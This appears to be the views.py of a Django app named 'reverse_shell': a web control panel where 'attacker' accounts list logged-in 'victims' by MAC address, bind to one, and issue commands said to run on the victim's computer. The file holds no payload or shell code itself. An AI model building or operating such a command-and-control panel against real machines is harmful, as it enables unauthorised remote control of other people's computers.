from .serializers import *
from django.views import View
from django.urls import reverse_lazy
from .models import Attacker, Victim
from django.contrib.auth.models import User
from rest_framework.response import Response
from rest_framework.decorators import action
from django.views.generic.edit import FormView
from django.views.generic.list import ListView
from rest_framework import viewsets, permissions
from django.utils.decorators import method_decorator
from django.contrib.auth.mixins import LoginRequiredMixin
from django.views.decorators.csrf import ensure_csrf_cookie
from django.contrib.auth.views import LoginView, LogoutView
from django.shortcuts import get_object_or_404, render, HttpResponse
from reverse_shell.permissions import IsOwnerOrReadOnly, IsOwnerOrVictim
from django.contrib.auth.forms import UserCreationForm, AuthenticationForm


def update_victim(user, logged_in):
    """
    Update the victim's logged_in field to either True or False.
    """
    victim = Victim.objects.filter(owner=user).first()
    if victim:
        victim.logged_in = logged_in
        victim.save()


class HomeViewSet(LoginRequiredMixin, View):
    """
    Index view. Renders the index html page.
    """
    def get(self, request):
        return render(request, 'index.html')


class RegisterView(FormView):
    """
    Register view. Renders a UserCreationForm and creates a User using the information provided.
    Redirects to login page after a successfull creation.
    """
    template_name = 'registration/register.html'
    form_class = UserCreationForm
    success_url = reverse_lazy('reverse_shell:login')

    def form_valid(self, form):
        # This method is called when valid form data has been POSTed.
        # It should return an HttpResponse.
        user = form.save()
        if 'victim' not in self.request.POST:
            # Create Attacker with the user as the owner.
            Attacker.objects.create(owner=user)
            return super().form_valid(form)


@method_decorator(ensure_csrf_cookie, name='dispatch')
class ValidateLoginView(View):
    """
    This view accepts login credentials and returns a response depending on whether or not the credentials ar valid.
    """

    def get(self, request):
        return HttpResponse(status=200)

    def post(self, request):
        form = AuthenticationForm(request, data=request.POST)
        if form.is_valid():
            return HttpResponse(status=200)
        else:
            return HttpResponse(status=401)


class LoginView(LoginView):
    """
    Login view. Accepts login credentials and checks if they are valid. Uses the login.html as the template.
    Redirects to the address stored in LOGIN_REDIRECT_URL in settings.py.
    """
    def form_valid(self, form):
        update_victim(form.get_user(), logged_in=True)  # Update the victim's state to logged in.
        return super().form_valid(form)


class LogoutView(LogoutView):
    """
    Logout view. Logs the user out. Uses the logout.html as the template.
    Redirects to the address stored in LOGOUT_REDIRECT_URL in settings.py.
    """
    def dispatch(self, request, *args, **kwargs):
        if not request.user.is_anonymous:
            update_victim(request.user, logged_in=False)    # Update the victim's state to logged out.
        return super().dispatch(request)


class VictimsView(ListView, LoginRequiredMixin):
    """
    The view for choosing a victim. The view displays only the logged in victims and lets the attacker choose to which
    one to connect.
    """
    model = Victim
    context_object_name = 'victims_list'   # name for the list as a template variable
    queryset = Victim.objects.filter(logged_in=True, attacker__isnull=True)
    template_name = 'choose_victim.html'  # Specify template name/location


class AttackView(View):
    """
    Attack view. Tries to connect to the victim if there is one connected to the attacker. In this view the attacker
    executes the commands that are run on the victim's computer.
    """
    def get(self, request, mac_address):
        attacker = get_object_or_404(Attacker, owner=request.user)
        victim = get_object_or_404(Victim, mac_address=mac_address)
        attacker.victim = victim
        attacker.save()
        return render(request, 'attack.html')


@method_decorator(ensure_csrf_cookie, name='dispatch')
class AttackerViewSet(viewsets.ModelViewSet):
    """
    A simple ViewSet for viewing attackers.
    """
    queryset = Attacker.objects.all()
    serializer_class = AttackerSerializer
    permission_classes = [permissions.IsAuthenticated, IsOwnerOrVictim]

    @action(detail=False, methods=['get'])
    def get_attacker(self, request):
        """
        Returns attacker by request user.
        """
        attacker = get_object_or_404(Attacker, owner=request.user)
        serialized_attacker = AttackerSerializer(attacker, many=False)
        return Response(serialized_attacker.data)

    def perform_create(self, serializer):
        serializer.save(owner=self.request.user)


@method_decorator(ensure_csrf_cookie, name='dispatch')
class VictimViewSet(viewsets.ModelViewSet):
    """
    A simple ViewSet for viewing victims.
    """
    queryset = Victim.objects.all()
    serializer_class = VictimSerializer
    permission_classes = [permissions.IsAuthenticated, IsOwnerOrReadOnly]

    @action(detail=False, methods=['get'])
    def available_victims(self):
        """
        Returns all the logged in victims.
        :return: Serialized victims that are logged in.
        """
        available_victims = Victim.objects.filter(logged_in=True)
        serialized_victims = VictimSerializer(available_victims, many=True)
        return Response(serialized_victims.data)

    def perform_create(self, serializer):
        serializer.save(owner=self.request.user)


class UserViewSet(viewsets.ReadOnlyModelViewSet):
    """
    A simple ViewSet for viewing users.
    """
    queryset = User.objects.all()
    serializer_class = UserSerializer
    permission_classes = [permissions.IsAdminUser]
